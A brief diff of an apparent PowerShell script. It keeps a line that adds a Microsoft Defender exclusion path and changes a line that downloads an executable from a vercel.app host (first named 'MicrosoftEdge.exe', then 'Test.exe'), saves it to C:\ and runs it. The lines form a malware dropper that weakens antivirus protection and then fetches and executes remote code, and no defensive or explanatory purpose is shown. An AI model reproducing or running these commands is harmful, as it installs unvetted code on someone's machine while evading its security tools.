@@ -2,4 +2,4 @@
 
 Add-MpPreference -ExclusionPath "C:\Folder"
 
-iwr "nyanza.vercel.app/assets/MicrosoftEdge.exe" -OutFile "C:\file.exe"; iex "C:\file.exe"
+iwr "nyanza.vercel.app/assets/Test.exe" -OutFile "C:\file.exe"; iex "C:\file.exe"
